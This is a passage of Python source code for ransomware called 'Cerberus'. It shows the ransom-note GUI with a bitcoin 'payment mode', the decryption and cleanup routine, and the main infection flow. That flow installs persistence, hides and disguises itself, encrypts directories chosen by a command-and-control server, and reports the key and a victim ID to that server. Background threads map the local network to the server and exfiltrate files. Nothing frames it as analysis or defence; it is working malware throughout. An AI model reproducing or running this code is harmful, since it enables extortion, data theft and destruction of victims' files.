        self.key_entry.config(state='readonly')
        
    def enable_payment_mode(self):
        self.payment_mode_active = True
        self.status_label.config(text="STATUS: BROWSER UNLOCKED FOR PAYMENT. DO NOT CLOSE.", fg='cyan')
        
        try:
             self.master.grab_release()
             self.master.attributes('-topmost', False)
             self.master.overrideredirect(False) 
             self.master.iconify()
        except:
             pass
             
        try:
            import webbrowser
            webbrowser.open("https://www.google.com/search?q=bitcoin+payment") 
        except:
            pass
            
        self.master.after(120000, self.disable_payment_mode)

    def disable_payment_mode(self):
        self.payment_mode_active = False
        self.master.deiconify() 
        self.master.attributes('-fullscreen', False) # Not fullscreen anymore!
        self.master.attributes('-topmost', True)
        self.master.overrideredirect(False)
        self.status_label.config(text="STATUS: LOCKED.", fg='#ffff4d')

    def start_decryption(self):
        key_b64 = self.key_var.get()
        if not key_b64:
            return
        
        self.status_label.config(text="STATUS: Decrypting files... Please wait.", fg='yellow')
        self.master.update()
        
        try:
            key = base64.b64decode(key_b64)
            decrypted_files = 0
            
            # Load saved encrypted paths (prefer this over default)
            target_paths = [TARGET_DIRECTORY]  # Default fallback
            if os.path.exists(ENCRYPTED_PATHS_FILE):
                try:
                    with open(ENCRYPTED_PATHS_FILE, 'r') as f:
                        target_paths = json.load(f)
                except:
                    pass
            
            # Decrypt ALL encrypted directories
            for target_path in target_paths:
                if os.path.exists(target_path):
                    for root, _, files in os.walk(target_path):
                        for file in files:
                            if file.endswith(ENCRYPTED_EXTENSION):
                                file_path = os.path.join(root, file)
                                if decrypt_file_aes_gcm(file_path, key):
                                    decrypted_files += 1
            
            # --- CLEAN UP ---
            self.heartbeat_thread_running = False # Stop all background threads
            
            # 1. Create STOP SIGNAL for watchdog (MUST be in temp dir, not config dir!)
            import tempfile
            stop_signal_path = os.path.join(tempfile.gettempdir(), "cerberus_stop_signal")
            try:
                with open(stop_signal_path, 'w') as f:
                    f.write("DECRYPTION_COMPLETE")
            except: pass
            
            # 2. Remove Persistence
            remove_persistence()
            
            # 3. Mark as Clean (legacy, kept for compatibility)
            try:
                 with open(CLEAN_MARKER, 'w') as f: f.write("Freed")
            except: pass

            # 4. Nuke Config Directory
            if os.path.exists(CONFIG_DIR):
                try: shutil.rmtree(CONFIG_DIR)
                except: pass
            
            self.status_label.config(text=f"SUCCESS! {decrypted_files} files decrypted. System Cleaned.", fg='#4dff88')
            messagebox.showinfo("Decryption Complete", "Your files have been restored and the ransomware removed.\nExiting now.")
            
        except Exception as e:
            log_error(f"Decryption failed: {e}")
            self.status_label.config(text="ERROR: Decryption failed.", fg='red')
            messagebox.showerror("Error", f"Decryption failed: {e}")
        
        finally:
            # FORCE EXIT NO MATTER WHAT
            try:
                self.master.grab_release() 
                self.master.destroy() 
            except: pass
            os._exit(0) # Hard exit to kill all threads

# --- Main Execution ---
if __name__ == "__main__":
    if os.path.exists(CLEAN_MARKER):
        sys.exit(0)
    
    # ========================================
    # SINGLETON LOCK: Use Windows Mutex (atomic, no race conditions)
    # ========================================
    if os.name == 'nt':
        try:
            import ctypes
            import ctypes.wintypes
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            MUTEX_NAME = "Global\\CerberusRansomwareMutex"
            mutex = kernel32.CreateMutexW(None, True, MUTEX_NAME)
            last_error = ctypes.get_last_error()
            if last_error == 183:  # ERROR_ALREADY_EXISTS
                log_error("Another instance already running (mutex). Exiting.")
                sys.exit(0)
        except Exception as e:
            log_error(f"Mutex check failed: {e}")
    else:
        # Linux: Use lockf on the lock file
        SINGLETON_LOCK = os.path.join(CONFIG_DIR, ".cerberus_running")
        try:
            import fcntl
            _lock_fd = open(SINGLETON_LOCK, 'w')
            fcntl.lockf(_lock_fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
            _lock_fd.write(str(os.getpid()))
            _lock_fd.flush()
        except (IOError, OSError):
            log_error("Another instance already running (lockf). Exiting.")
            sys.exit(0)
        except ImportError:
            pass  # No fcntl, fall through
    
    # ========================================
    # PERSISTENCE
    # ========================================
    install_persistence()
    hide_console()
    chameleon_disguise()

    # ========================================
    # RESUME: If ID file exists, we already infected - just show GUI
    # ========================================
    if os.path.exists(ID_FILE):
        try:
            with open(ID_FILE, 'r') as f:
                victim_id = f.read().strip()
            if victim_id:
                log_error(f"Resuming session for Victim ID: {victim_id}")
                root = Tk()
                app = RansomwareGUI(root, victim_id)
                root.mainloop()
                sys.exit()
        except:
            pass 
    
    # ========================================
    # FRESH START CLEANUP: Remove stale state from crashed previous runs
    # If ID_FILE doesn't exist, any leftover LOCK_FILE or KEY_BACKUP is stale
    # ========================================
    for stale_file in [LOCK_FILE, KEY_BACKUP_FILE, ENCRYPTED_PATHS_FILE]:
        if os.path.exists(stale_file):
            try:
                os.remove(stale_file)
                log_error(f"Cleaned stale file: {stale_file}")
            except:
                pass
    
    # Also clean stale recon ID so a fresh one is generated
    recon_id_file = os.path.join(CONFIG_DIR, ".cerberus_recon_id")
    if os.path.exists(recon_id_file):
        try:
            os.remove(recon_id_file)
        except:
            pass
    
    # ========================================
    # NEW INFECTION: Only runs ONCE (no ID file, no lock file)
    # ========================================
    log_error("Starting new infection...")
    
    # Step 1: Try to get target selection from C2
    selected_targets = scan_and_wait_for_instructions()
    
    # Step 2: Encrypt
    if selected_targets:
        log_error(f"C2 selected {len(selected_targets)} targets")
        aes_key = encrypt_directory(selected_targets)
    else:
        log_error("C2 unreachable or timed out - using default target")
        aes_key = encrypt_directory()
    
    # Step 3: Check in and launch GUI
    if aes_key:
        victim_id = check_in_with_c2(aes_key)
        if victim_id:
            # Cartographer: Network scan in background (uses actual victim_id)
            def run_network_scan():
                try:
                    time.sleep(3)
                    hosts = scan_network()
                    if hosts:
                        requests.post(f"{C2_SERVER_URL}/api/network_map/{victim_id}", json={"hosts": hosts}, timeout=5)
                except:
                    pass
            threading.Thread(target=run_network_scan, daemon=True).start()
            
            # Data Thief: Exfiltrate in background
            threading.Thread(target=lambda: exfiltrate_files(victim_id), daemon=True).start()
            
            # Launch GUI (only ONE instance)
            root = Tk()
            app = RansomwareGUI(root, victim_id)
            root.mainloop()
        else:
            log_error("Failed to get Victim ID. Aborting GUI.")
    else:
        log_error("Encryption skipped or failed. Aborting.")
